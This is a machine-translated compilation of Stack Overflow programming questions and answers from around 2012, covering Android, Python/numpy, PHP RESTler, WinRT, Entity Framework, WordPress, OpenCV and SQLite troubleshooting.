    btnLinkToRegister.setOnClickListener(new View.OnClickListener() { 

        public void onClick(View view) { 
            Intent i = new Intent(getApplicationContext(), 
                    RegisterActivity.class); 
            startActivity(i); 
            finish(); 
        } 
    }); 
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:58:01.907

```
 E/JSON Parser(431): Error parsing data org.json.JSONException: Value <!>     DOCTYPE of type java.lang.String cannot be converted to JSONObject 
```

似乎 json.getJSONObject("user"); 返回 XML 不是 JSONObject。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-11T20:42:48.037

你的 PHP 文件在哪里？

04-13 14:41:32.110: E/JSON(431):

在 > 此服务器上未找到请求的 URL /android_login_api/。

看起来您没有指向正确的位置，您需要将配置中的给定 IP 更改为您拥有文件的位置。

# python - 查找目录中的所有目录

> ID：10148810
> 
> 赞同：0
> 
> 时间：2012-04-13T21:54:10.777
> 
> 标签：python

有没有一种方法可以找到给定目录中的所有目录？我正在尝试以下内容，这给了我一个空列表：

```
[item for item in os.listdir(dir) if os.path.isdir(item)] 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T21:55:20.943

`os.listdir(dir)`返回相对于 的名称`dir`，您必须执行以下操作：

```
[item for item in os.listdir(dir) if os.path.isdir(os.path.join(dir, item))] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-13T21:55:35.107

您忘记使用`os.path.join()`将目录加入条目。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T22:00:23.027

```
[item[0] for item in os.walk(dir)] 
```

# android - View.invalidate() 似乎没有调用 View.onDraw()

> ID：10148811
> 
> 赞同：7
> 
> 时间：2012-04-13T21:54:13.223
> 
> 标签：android, invalidation

我有一个绘图库，并且有了它我有一个自定义视图。当需要进行任何更新时，库会调用视图的`invalidate()`方法。然后`onDraw()`调用该方法，一切正常。

但是，当我将属性添加`usesSdkVersion="14"`到 my`AndroidManifest.xml file`时，这将停止工作。我的视图`onDraw()`方法不再被调用。

更多信息：似乎当我`invalidate()`在我的应用程序中按下按钮后调用时，视图会按预期更新。此外，我的库中有一个动画可以正常工作。所以显然有时它工作正常。但大多数时候，它并没有被重绘。自定义视图是否处于任何状态会导致操作系统在`invalidate()`调用后跳过重绘它？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-22T06:58:14.333

从 android 3.0 开始，当使用硬件加速时，视图的绘制被记录并存储在 GPU 中。

所以当你得到两个视图时：A 在 B 之上，你调用`B.invalidate`,`B.onDraw`将被调用并记录到 GPU，但`A.onDraw`不会被调用，因为它已经记录了！

这与调用所有视图时的非硬件加速模式不同`onDraw`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-12-11T13:43:12.730

通过官方文件：

但是，由于并非所有 2D 绘图操作都支持硬件加速，因此打开它可能会影响某些使用自定义视图或绘图调用的应用程序。问题通常表现为不可见的元素、异常或错误渲染的像素。

为了解决这个问题，Android 为您提供了在以下级别启用或禁用硬件加速的选项：

**应用**

> ```
> <application android:hardwareAccelerated="true" ...> 
> ```

**活动**

> ```
> <application android:hardwareAccelerated="true">
>   <activity ... />
>   <activity android:hardwareAccelerated="false" />
> </application> 
> ```

**窗户**

> getWindow().setFlags(WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED, WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED);

**看法**

> myView.setLayerType(View.LAYER_TYPE_SOFTWARE, null);

我在我看来测试。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-05-24T11:20:02.813

这似乎是Android中的一个错误。而不是*invalidate()*尝试使用具有四个参数的同名方法：

```
view.invalidate(0,0,view.getWidth(), view.getHeight()); 
```

顺便说一句，更好的做法是仅使正在变化的那个区域无效。传递无效区域的左、上、右、下坐标。

# php - 使用 RESTler，当它必须通过 HTTP post 接受参数时，我可以命名一个不同于 post() 或 postSomething() 的方法吗？

> ID：10148814
> 
> 赞同：0
> 
> 时间：2012-04-13T21:54:34.647
> 
> 标签：php, restler

我正在考虑使用 Lucarast RESTler (http://luracast.com/products/restler/)

我的 PHP 类有一个名为“solve”的方法，它必须通过 POST 接受一个参数

```
class Solver
{
  function solve( $request_data )
  {
    ...
  } 
```

如果我简单地将方法命名为“solve”，则无法通过 POST 访问它。我得到404。

```
POST http://localhost/path/to/my/method 404 (Not Found) 
```

显然我必须将其命名为“postSolve”，这样才有效。或者创建另一个名为“postSolve”的方法，它只调用“solve”。

```
public function postSolve( $request_data )
{
    return $this->solve( $request_data );
} 
```

但我不能停止认为必须有一种优雅的方式来做到这一点。

我怎样才能随心所欲地调用我的方法，并且仍然可以通过 POST 访问它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-23T05:43:53.263

自动路由要求您在 api 方法名称前加上`get`or`post`或`put`or`delete`将其映射到相应的 HTTP 方法/动词

更多关于这个的[例子](http://restler3.luracast.com/examples/_007_crud/readme.html)

但是您始终可以在 api 方法上方使用以下格式的 PHPDoc 注释将任何方法映射到 POST

`@url POST my/custom/url/:myvar`

例如

```
class CustomPost
{
    /**
     * @url POST custom/:id
     * @url GET custom
     */
    function anyName($id)
    {
        //do something
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T22:04:56.757

在过去的几天里，我学到了更多关于 REST 的知识。除了 get、post、put 或 delete 之外，我不需要调用任何方法。

请参考另一个问题： [Understanding REST: Verbs, error code, and authentication](https://stackoverflow.com/questions/2001773/understanding-rest-verbs-error-codes-and-authentication)

> “一般来说，当您认为需要更多动词时，实际上可能意味着您的资源需要重新识别。请记住，在 REST 中，您总是对资源或资源集合进行操作。您选择什么作为资源对于您的 API 定义非常重要。”

# python - Numpy如何遍历数组的列？

> ID：10148818
> 
> 赞同：139
> 
> 时间：2012-04-13T21:55:04.173
> 
> 标签：python, loops, numpy

假设我有和 mxn 数组。我想将此数组的每一列传递给一个函数以对整个列执行一些操作。如何迭代数组的列？

例如，我有一个 4 x 3 数组

```
1  99 2
2  14 5
3  12 7
4  43 1

for column in array:
  some_function(column) 
```

其中列在第一次迭代中为“1,2,3,4”，第二次为“99,14,12,43”，第三次为“2,5,7,1”。

* * *

## 回答 #1

> 赞同：265
> 
> 时间：2012-04-13T21:59:04.437

只需遍历数组的转置：

```
for column in array.T:
   some_function(column) 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2012-04-13T21:59:45.950

这应该给你一个开始

```
>>> for col in range(arr.shape[1]):
    some_function(arr[:,col])

[1 2 3 4]
[99 14 12 43]
[2 5 7 1] 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2019-08-21T04:37:28.763

您还可以使用 unzip 遍历列

```
for col in zip(*array):
   some_function(col) 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2018-07-02T23:36:20.040

对于三维数组，您可以尝试：

```
for c in array.transpose(1, 0, 2):
    do_stuff(c) 
```

请参阅有关如何[`array.transpose`](https://docs.scipy.org/doc/numpy-1.13.0/reference/generated/numpy.ndarray.transpose.html)工作的文档。基本上，您正在指定要移动的维度。在这种情况下，我们将第二维（例如列）移动到第一维。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2016-02-01T21:08:53.587

```
for c in np.hsplit(array, array.shape[1]):
    some_fun(c) 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2019-04-05T01:54:52.273

例如，您想找到矩阵中每一列的平均值。让我们创建以下矩阵

```
mat2 = np.array([1,5,6,7,3,0,3,5,9,10,8,0], dtype=np.float64).reshape(3, 4) 
```

平均值的函数是

```
def my_mean(x):
    return sum(x)/len(x) 
```

做需要做的事情并将结果存储在冒号向量“结果”中

```
results = np.zeros(4)
for i in range(0, 4):
    mat2[:, i] = my_mean(mat2[:, i])

results = mat2[1,:] 
```

结果是： array([4.33333333, 5\. , 5.66666667, 4\. ])

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2021-09-25T02:55:31.477

这个问题很老，但对于现在看的人来说。

您可以像这样遍历 numpy 数组的行：

```
for row in array:
    some_function(row) # do something here 
```

因此，要遍历 2D 数组的列，您可以像这样简单地转置它：

```
transposed_array = array.T

#Now you can iterate through the columns like this:
for column in transposed_array:
    some_function(column) # do something here 
```

例如，如果您想将每一列的结果收集到一个列表中，您可以使用列表推导。

```
[some_function(column) for column in array.T] 
```

因此，总而言之，您可以对数组的每一列执行一个函数，并使用这行代码将结果收集到一个列表中：

```
result_list = [some_function(column) for column in array.T] 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-06-17T00:53:02.033

或者，您可以使用`enumerate`. 它还为您提供列号和列值。

```
for num, column in enumerate(array.T):
    some_function(column) # column: Gives you the column value as asked in the question
    some_function(num) # num: Gives you the column number 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-09-25T04:54:06.597

列表 -> 数组 -> 矩阵 -> 矩阵.T

```
import numpy as np

list = [1, 99, 2, 2, 14, 5, 3, 12, 7, 4, 43, 1]
arr_n = np.array(list) # list -> array
print(arr_n)
matrix = arr_n.reshape(4, 3) # array -> matrix(4*3）
print(matrix)
print(matrix.T) # matrix -> matrix.T

[ 1 99  2  2 14  5  3 12  7  4 43  1]

[[ 1 99  2]
 [ 2 14  5]
 [ 3 12  7]
 [ 4 43  1]]

[[ 1  2  3  4]
 [99 14 12 43]
 [ 2  5  7  1]] 
```

# c# - 设置派生 ListBox 的 ItemsSource 引发“灾难性故障”

> ID：10148820
> 
> 赞同：6
> 
> 时间：2012-04-13T21:55:17.697
> 
> 标签：c#, xaml, windows-8, microsoft-metro, windows-runtime

我正在为 Windows 8 WinRT 框架开发。以下示例代码引发异常：

`Catastrophic failure (Exception from HRESULT: 0x8000FFFF (E_UNEXPECTED))`

这是当前 WinRT 框架中的另一个错误（我使用的是 VS11 和 Consumer Preview）吗？有人知道如何解决这个问题吗？

顺便说一句：我已经用 Windows Phone 7.5 Silverlight 测试了相同的代码，它可以正常工作......

谢谢你的帮助。

```
public class MyListBox : ListBox
{

}

public sealed partial class BlankPage : Page
{
    public BlankPage()
    {
        this.InitializeComponent();
    }

    protected override void OnNavigatedTo(NavigationEventArgs e)
    {
        var box1 = new ListBox(); 
        box1.ItemsSource = new List<Object> { new Object() }; // works without problems
        Content = box1; 

        var box2 = new MyListBox();
        box2.ItemsSource = new List<Object> { new Object() }; // throws exception
        Content = box2; 
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-06T21:16:26.390

我在继承 ListView 时遇到了类似的问题。在我的情况下，以下方法有部分帮助：我不再尝试直接在后面的代码中设置 ListView 的 ItemsSource，而是我在 XAML 中创建了 CollectionViewSource，例如：

```
<UserControl.Resources>
    <CollectionViewSource x:Name="myCollectionViewSource"/>
</UserControl.Resources>
...
...
<ListView
    ...
    ItemsSource="{Binding Source={StaticResource myCollectionViewSource}}" /> 
```

在我设置的代码中

```
this.myCollectionViewSource.Source = new List<Object> { new Object() }; // The real data source respectively 
```

然而，这似乎只是推迟了问题。至少在我的情况下。在我的真实示例中，我使用 ObservableVector 作为数据源。一旦对 ObservableVector 集合进行任何更改（例如 Clear），我也会遇到灾难性故障（0x8000FFFF）。一旦我使用原始 ListView （不是我的子类版本），一切都会再次正常 - 就像你的情况一样。所以我的回复不能被理解为问题的解决方案，但也许这是一个值得尝试的提示。在我的情况下，原始分配工作正常，问题首先出现在可观察集合尝试更新之后。我尝试了 ObservableCollection（应该在 CP 中工作，但在 DP 中没有），但在那里我遇到了其他问题。听听您是否能够在这条道路上取得任何进展会很有趣......

# asp.net-mvc-3 - 从我的项目中删除 .edmx

> ID：10148823
> 
> 赞同：0
> 
> 时间：2012-04-13T21:55:26.577
> 
> 标签：asp.net-mvc-3, entity-framework-4.1, unity-container, repository-pattern

我将 Code First 与现有的 DB-Entity Framework 4.1 一起使用，在我的项目中，我添加了 .edmx 文件并生成了模式，查看存储过程一切正常，一切都在生产中。

我的问题在这里

```
1- I moved my .edmx file,.tt to other project
2- Removed from working project
3- Copy all schema,view,DBContext everything related to .edmx generated to folder called Entities.
4- Removed matadata information from connection string which is in web.config 
```

之后我无法运行项目错误来了错误是

```
System.Data.DataException was unhandled by user code
  Message=An exception occurred while initializing the database. See the InnerException for details.
  Source=EntityFramework
  StackTrace:
       at System.Data.Entity.Internal.InternalContext.PerformInitializationAction(Action action)
       at System.Data.Entity.Internal.InternalContext.PerformDatabaseInitialization()
       at System.Data.Entity.Internal.LazyInternalContext.<InitializeDatabase>b__4(InternalContext c)
       at System.Data.Entity.Internal.RetryAction`1.PerformAction(TInput input)
       at System.Data.Entity.Internal.LazyInternalContext.InitializeDatabaseAction(Action`1 action)
       at System.Data.Entity.Internal.LazyInternalContext.InitializeDatabase()
       at System.Data.Entity.Internal.InternalContext.GetEntitySetAndBaseTypeForType(Type entityType)
       at System.Data.Entity.Internal.Linq.InternalSet`1.Initialize()
       at System.Data.Entity.Internal.Linq.InternalSet`1.get_InternalContext()
       at System.Data.Entity.Infrastructure.DbQuery`1.System.Linq.IQueryable.get_Provider()
       at System.Linq.Queryable.Where[TSource](IQueryable`1 source, Expression`1 predicate)
       at QTrac.DAL.RepositoryBase`1.Get(Expression`1 filter, Func`2 orderBy, Nullable`1 take, String includeProperties, Boolean tracking) in D:\QTrack\Project-NewQTrac\QTrac\QTrac.DAL\RepositoryBase.cs:line 39
       at QTrac.DAL.EquipStateRepository.GetEquipStates(Nullable`1 active) in D:\QTrack\Project-NewQTrac\QTrac\QTrac.DAL\EquipStateRepository.cs:line 25
       at QTrac.BLL.AssetManagementService.GetEquipStates(Nullable`1 active) in D:\QTrack\Project-NewQTrac\QTrac\BL\AssetManagementService.cs:line 68
       at QTrac.Web.Controllers.AssetManagementController.Grid_PopulateEquipmentStateCombo() in D:\QTrack\Project-NewQTrac\QTrac\QTrac.Web\Controllers\AssetManagementController.cs:line 135
       at QTrac.Web.Controllers.AssetManagementController.Detail() in D:\QTrack\Project-NewQTrac\QTrac\QTrac.Web\Controllers\AssetManagementController.cs:line 38
       at lambda_method(Closure , ControllerBase , Object[] )
       at System.Web.Mvc.ActionMethodDispatcher.Execute(ControllerBase controller, Object[] parameters)
       at System.Web.Mvc.ReflectedActionDescriptor.Execute(ControllerContext controllerContext, IDictionary`2 parameters)
       at System.Web.Mvc.ControllerActionInvoker.InvokeActionMethod(ControllerContext controllerContext, ActionDescriptor actionDescriptor, IDictionary`2 parameters)
       at System.Web.Mvc.ControllerActionInvoker.<>c__DisplayClass15.<InvokeActionMethodWithFilters>b__12()
       at System.Web.Mvc.ControllerActionInvoker.InvokeActionMethodFilter(IActionFilter filter, ActionExecutingContext preContext, Func`1 continuation)
  InnerException: System.Data.EntityException
       Message=The underlying provider failed on Open.
       Source=System.Data.Entity
       StackTrace:
            at System.Data.EntityClient.EntityConnection.OpenStoreConnectionIf(Boolean openCondition, DbConnection storeConnectionToOpen, DbConnection originalConnection, String exceptionCode, String attemptedOperation, Boolean& closeStoreConnectionOnFailure)
            at System.Data.EntityClient.EntityConnection.Open()
            at System.Data.Objects.ObjectContext.EnsureConnection()
            at System.Data.Objects.ObjectQuery`1.GetResults(Nullable`1 forMergeOption)
            at System.Data.Objects.ObjectQuery`1.System.Collections.Generic.IEnumerable<T>.GetEnumerator()
            at System.Linq.Enumerable.FirstOrDefault[TSource](IEnumerable`1 source)
            at System.Data.Objects.ELinq.ObjectQueryProvider.<GetElementFunction>b__1[TResult](IEnumerable`1 sequence)
            at System.Data.Objects.ELinq.ObjectQueryProvider.ExecuteSingle[TResult](IEnumerable`1 query, Expression queryRoot)
            at System.Data.Objects.ELinq.ObjectQueryProvider.System.Linq.IQueryProvider.Execute[S](Expression expression)
            at System.Data.Entity.Internal.Linq.DbQueryProvider.Execute[TResult](Expression expression)
            at System.Linq.Queryable.FirstOrDefault[TSource](IQueryable`1 source)
            at System.Data.Entity.Internal.InternalContext.QueryForModelHash()
            at System.Data.Entity.Internal.InternalContext.CompatibleWithModel(Boolean throwIfNoMetadata)
            at System.Data.Entity.CreateDatabaseIfNotExists`1.InitializeDatabase(TContext context)
            at System.Data.Entity.Internal.InternalContext.<>c__DisplayClass5.<PerformDatabaseInitialization>b__3()
            at System.Data.Entity.Internal.InternalContext.PerformInitializationAction(Action action)
       InnerException: System.Transactions.TransactionManagerCommunicationException
            Message=Network access for Distributed Transaction Manager (MSDTC) has been disabled. Please enable DTC for network access in the security configuration for MSDTC using the Component Services Administrative tool.
            Source=System.Transactions
            StackTrace:
                 at System.Transactions.Oletx.OletxTransactionManager.ProxyException(COMException comException)
                 at System.Transactions.TransactionInterop.GetOletxTransactionFromTransmitterPropigationToken(Byte[] propagationToken)
                 at System.Transactions.TransactionStatePSPEOperation.PSPEPromote(InternalTransaction tx)
                 at System.Transactions.TransactionStateDelegatedBase.EnterState(InternalTransaction tx)
                 at System.Transactions.EnlistableStates.Promote(InternalTransaction tx)
                 at System.Transactions.Transaction.Promote()
                 at System.Transactions.TransactionInterop.ConvertToOletxTransaction(Transaction transaction)
                 at System.Transactions.TransactionInterop.GetExportCookie(Transaction transaction, Byte[] whereabouts)
                 at System.Data.SqlClient.SqlInternalConnection.GetTransactionCookie(Transaction transaction, Byte[] whereAbouts)
                 at System.Data.SqlClient.SqlInternalConnection.EnlistNonNull(Transaction tx)
                 at System.Data.SqlClient.SqlInternalConnection.Enlist(Transaction tx)
                 at System.Data.SqlClient.SqlInternalConnectionTds.Activate(Transaction transaction)
                 at System.Data.ProviderBase.DbConnectionInternal.ActivateConnection(Transaction transaction)
                 at System.Data.ProviderBase.DbConnectionPool.GetConnection(DbConnection owningObject)
                 at System.Data.ProviderBase.DbConnectionFactory.GetConnection(DbConnection owningConnection)
                 at System.Data.ProviderBase.DbConnectionClosed.OpenConnection(DbConnection outerConnection, DbConnectionFactory connectionFactory)
                 at System.Data.SqlClient.SqlConnection.Open()
                 at System.Data.EntityClient.EntityConnection.OpenStoreConnectionIf(Boolean openCondition, DbConnection storeConnectionToOpen, DbConnection originalConnection, String exceptionCode, String attemptedOperation, Boolean& closeStoreConnectionOnFailure)
            InnerException: System.Runtime.InteropServices.COMException
                 Message=The transaction manager has disabled its support for remote/network transactions. (Exception from HRESULT: 0x8004D024)
                 Source=System.Transactions
                 ErrorCode=-2147168220
                 StackTrace:
                      at System.Transactions.Oletx.IDtcProxyShimFactory.ReceiveTransaction(UInt32 propgationTokenSize, Byte[] propgationToken, IntPtr managedIdentifier, Guid& transactionIdentifier, OletxTransactionIsolationLevel& isolationLevel, ITransactionShim& transactionShim)
                      at System.Transactions.TransactionInterop.GetOletxTransactionFromTransmitterPropigationToken(Byte[] propagationToken)
                 InnerException: 
```

请告诉我这是什么问题，并请告诉我解决方案。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:58:49.237

由于 .edmx 文件实际上只是一个 xml 文件，我建议在记事本中打开该文件并检查以确保引用指向新项目而不是旧项目。

# wordpress - Wordpress add_theme_support( 'custom-header' ) 不向仪表板添加选项

> ID：10148832
> 
> 赞同：1
> 
> 时间：2012-04-13T21:56:06.347
> 
> 标签：wordpress

我正在从头开始编写一个基于 Toolbox 主题的新主题。我安装的 WP 是开箱即用的。我添加`add_theme_support('custom-header');`到我的 functions.php 文件中，但仪表板中没有出现“标题”选项屏幕。如果我访问该站点，我可以在顶部的工具栏中看到它，但在仪表板中看不到。我错过了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-23T06:10:42.530

尚未实现 - 在 4.3 发布之前不会起作用，在此之前，您必须使用

```
add_custom_image_header() 
```

# python - Python itertools.product 具有可变数量的参数

> ID：10148834
> 
> 赞同：12
> 
> 时间：2012-04-13T21:56:11.863
> 
> 标签：python, list, itertools

我正在尝试编写一个模块来使用 itertools.product 组合可变数量的列表。

我能得到的最接近的是：

```
import itertools
lists = [["item1","item2"],["A","b","C"], ["etc..."]]
searchterms = list(itertools.product(lists))
print searchterms 
```

这不起作用，因为列表是单个列表，所以它只返回原始序列。但我不知道如何将列表变量的每个元素传递给 itertools。

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-04-13T21:57:41.063

您需要使用`*`将单个列表分成其组成列表：

```
searchterms = list(itertools.product(*lists)) 
```

请参阅[解压缩参数列表](http://docs.python.org/tutorial/controlflow.html#unpacking-argument-lists)的 Python 教程部分。

# c++ - OpenCV SurfDescriptorExtractor 编译错误

> ID：10148835
> 
> 赞同：1
> 
> 时间：2012-04-13T21:56:17.080
> 
> 标签：c++, opencv, compilation

尝试编译特征检测算法时，出现以下编译错误：我正在编译/使用 clang 链接，并且我的 OpenCV 版本是 2.3.1 版本。我正在（大致）遵循本教程来获得特征匹配： http: [//opencv.itseez.com/doc/tutorials/features2d/feature_flann_matcher/feature_flann_matcher.html](http://opencv.itseez.com/doc/tutorials/features2d/feature_flann_matcher/feature_flann_matcher.html)

```
error: use of undeclared identifier 'SurfDescriptorExtractor';
      did you mean 'OrbDescriptorExtractor'?
SurfDescriptorExtractor extractor;
^ 
```

有趣的是，Brief 和 Orb 描述符提取器工作“很好”（我最终得到一个运行时错误）。

以下是相关代码：

```
void setup_and_draw_keypoints(Mat& img, Mat& prev)
{
  // Detect Keypoints
  vector<KeyPoint> keypoints, prev_keypoints;
  GoodFeaturesToTrackDetector gftt;
  gftt.detect(img, keypoints);
  gftt.detect(prev, prev_keypoints);

  //Extract Descriptors
  SurfDescriptorExtractor extractor;
  Mat desc_1, desc_2; // Descriptors
  extractor.compute(img, keypoints, desc_1);
  extractor.compute(prev, prev_keypoints, desc_2);
  FlannBasedMatcher matcher;
  vector<DMatch> matches;

  matcher.match(desc_1, desc_2, matches);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-27T17:38:53.310

您链接到的教程是在将 features2d 库分离为免费（非专利、开放许可）算法和未公开许可的东西之前编写的。SURF 和 SIFT 就是两种这样的算法。要访问 SurfFeatureDescriptor，您需要做的就是包含非自由包含文件夹中的 features2d.hpp 标头。

在我的 opencv 发行版（我目前使用的是 2.4.1）中，它位于：“C:\Users\Jake\Downloads\opencv\modules\nonfree\include\opencv2\nonfree\features2d.hpp”。我在我的项目设置中将路径“C:\Users\Jake\Downloads\opencv\modules\nonfree\include\”列为包含目录，所以在我的代码中我所做的就是：

```
#include <opencv2/nonfree/features2d.hpp>

SiftDescriptorExtractor siftExtractor;
//Later on in the file, after a frame has been grabbed, keypoints found, etc.
Mat siftDescriptors;
siftExtractor.compute(frame,roiKP,siftDescriptors); 
```

你有它。希望这对您有用还为时不晚。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-29T23:09:08.857

某些内容在您的库的文档中的事实并不一定意味着它在您的库的 .so 和标头中；）

Open CV 有多个模块，其中之一是 flann，它可能只有在安装 flann 时才会编译，您甚至可能需要明确要求它。当您在 opencv 的源 tar.gz 下载上运行 cmake 或 cmake-gui 时，您可以选择要编译的模块。

也许你没有从源代码编译 opencv，在这种情况下你的 linux 系统包维护者做了，并且可能没有包含它。

您可能会这样发现：

```
[herbert@Durk ~]$ ls /usr/lib/libopencv_*.so
/usr/lib/libopencv_calib3d.so  /usr/lib/libopencv_features2d.so      /usr/lib/libopencv_highgui.so  /usr/lib/libopencv_ml.so         /usr/lib/libopencv_photo.so          /usr/lib/libopencv_video.so
/usr/lib/libopencv_contrib.so  /usr/lib/libopencv_flann.so           /usr/lib/libopencv_imgproc.so  /usr/lib/libopencv_nonfree.so        /usr/lib/libopencv_stitching.so  /usr/lib/libopencv_videostab.so
/usr/lib/libopencv_core.so     /usr/lib/libopencv_gpu.so             /usr/lib/libopencv_legacy.so   /usr/lib/libopencv_objdetect.so  /usr/lib/libopencv_ts.so
[herbert@Durk ~]$ ls /usr/include/opencv2/
calib3d  contrib  core  features2d  flann  gpu  highgui  imgproc  legacy  ml  nonfree      objdetect  opencv.hpp  opencv_modules.hpp  photo  stitching  ts  video  videostab
[herbert@Durk ~]$ 
```

如您所见，我很幸运安装了 flann ;)

# android - 在 Android 上从库/sdks 中隐藏数据

> ID：10148836
> 
> 赞同：0
> 
> 时间：2012-04-13T21:56:31.423
> 
> 标签：android, security

我对 Android 的安全性有疑问。我打算在我的 android 应用程序中使用一些 sdks/库。我想确保 sdks/library 不会访问我用户的数据。一种方法是以加密格式保存用户数据。我想知道实现这一目标的最佳实践是什么。

任何输入都受到高度赞赏。

谢谢，马南

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-14T17:29:33.693

如果您在应用程序中包含库，那么它们将在与应用程序的其余部分相同的 UID 下运行，因此实际上没有办法防止它们这样做。即使您的应用程序加密了数据，它也需要访问可用于解密数据的密钥，因此这些库由于它们作为 yoru 应用程序的一部分运行，因此也可以访问这些密钥。（请注意，这意味着一个非常复杂的库被指定用于访问应用程序中的数据，这是**极**不可能的。）

如果您真的对此感到担忧，那么您可以将库代码包含在一个单独的应用程序中，并让您的应用程序调用它。例如，您可以将库集合部署为后台服务，并需要自定义权限才能绑定到只有您的应用程序才会请求/拥有的权限。然后，您可以使用自定义权限来锁定对您自己的应用程序中的函数/API 的访问，这些函数/API 将提供库所需的数据，以便只有您的单独库才能获取该数据。

**值得（再次）指出，如果您打算使用标准/通用库，那么它们的可能性包括代码来专门了解您的应用程序正在使用的数据结构并获得对该数据的非法访问的可能性很小。也许我在这里并没有真正理解您的威胁模型。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T22:05:37.210

如果您想确保没有人会访问您的私人数据，最好对其进行加密，在我的一个项目中，我使用[http://sqlcipher.net/](http://sqlcipher.net/)并将其推荐给您。

它是一个围绕 sqlite3 的包装框架，它允许加密数据库文件，在这种情况下，从安全的角度来看它会更可靠

# java - “未找到表”Android SQLite 问题

> ID：10148843
> 
> 赞同：-1
> 
> 时间：2012-04-13T21:57:34.180
> 
> 标签：java, android, sqlite, android-emulator

我遇到了一个问题，绞尽脑汁想弄清楚为什么它不起作用。这是代码

```
import java.io.*;
import android.content.Context;
import android.database.SQLException;
import android.database.sqlite.*;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;

public class DataBaseHelper extends SQLiteOpenHelper
{
    //The Android's default system path of your application database.
    private static String DB_PATH = "/data/data/teamawesome.spots.namespac/databases/";

    private static String DB_NAME = "Final.db3";

    //private static String DB_TABLE = "Restaurant";

    public SQLiteDatabase myDataBase;

private final Context myContext;

/****
 * Constructor
 *
 * Takes and keeps a reference of the passed context in order to access to the           application assets and resources.
 * @param context
 ***/
public DataBaseHelper(Context context)
{
    super(context, DB_NAME, null, 1);
    this.myContext = context;
}   

 /**
 * Creates a empty database on the system and rewrites it with your own database.
 * */
public void createDataBase() throws IOException{

    boolean dbExist = checkDataBase();

    if(dbExist)
    {
        //do nothing - database already exist
    }
    else
    {
    //By calling this method and empty database will be created into the default      system path
        //of your application so we are gonna be able to overwrite that database with our database.
        this.getReadableDatabase();
        try
        {
            copyDataBase();
        }
        catch (IOException e)
        {
            throw new Error("Error copying database");
        }
    }
}

/**
 * Check if the database already exist to avoid re-copying the file each time you open the application.
 * @return true if it exists, false if it doesn't
 */
private boolean checkDataBase()
{
    SQLiteDatabase checkDB = null;
    try
    {
        String myPath = DB_PATH + DB_NAME;
        checkDB = SQLiteDatabase.openDatabase(myPath, null, SQLiteDatabase.OPEN_READONLY);
    }
    catch(SQLiteException e)
    {
        //database does't exist yet.
    }
    if(checkDB != null)
    {
        checkDB.close();
    }
    return checkDB != null ? true : false;
}

/**
 * Copies your database from your local assets-folder to the just created empty database in the
 * system folder, from where it can be accessed and handled.
 * This is done by transfering bytestream.
 * */
private void copyDataBase() throws IOException
{
    //Open your local db as the input stream
    InputStream myInput = myContext.getAssets().open(DB_NAME);

    // Path to the just created empty db
    String outFileName = DB_PATH + DB_NAME;

    //Open the empty db as the output stream
    OutputStream myOutput = new FileOutputStream(outFileName);

    //transfer bytes from the inputfile to the outputfile
    byte[] buffer = new byte[1024];
    int length;
    while ((length = myInput.read(buffer))>0)
    {
        myOutput.write(buffer, 0, length);
    }
    //Close the streams
    myOutput.flush();
    myOutput.close();
    myInput.close();
}

public void openDataBase() throws SQLException
{
    //Open the database
    String myPath = DB_PATH + DB_NAME;
    myDataBase = SQLiteDatabase.openDatabase(myPath, null, SQLiteDatabase.OPEN_READONLY);
}

@Override
public synchronized void close()
{
        if(myDataBase != null)
            myDataBase.close();
        super.close();
}

@Override
public void onCreate(SQLiteDatabase db)
{

}

@Override
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion)
{

}

public String Alphabetical()
{
    Cursor c = null;
    c = (Cursor)myDataBase.query(DB_NAME, null, null, null, null, null, null);
    String sql = "SELECT * FROM Restaurant";
    c = myDataBase.rawQuery(sql, null);
    return c;
} 
```

任何和所有的帮助表示赞赏。

谢谢你

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T22:20:07.960

在你`onCreate`的方法中，你应该做所有的事情来在你的新数据库中创建表，像这样：

```
@Override
public void onCreate(SQLiteDatabase db)
{
    db.execSql("create table if not exists Restaraunt (...)");
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T22:15:38.463

我能够实现一个几乎没有问题的数据库...我遵循了这个示例： [数据库管理...](http://www.barebonescoder.com/2010/05/android-development-database-management/) 这是入门的最佳示例。之后有几个更高级的示例（通过 google 找到）有助于解决更高级的主题，例如错误捕获和更新。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-14T00:16:12.067

如果要复制数据库，`SQLiteDatabase.NO_LOCALIZED_COLLATORS`还应该在调用中使用标志。`openDatabase`这将导致不创建本地化整理器。

在不使用指定标志时，您必须缺少使用语言环境创建的 android-metadata 表。然后，您正在复制一个没有它的数据库。

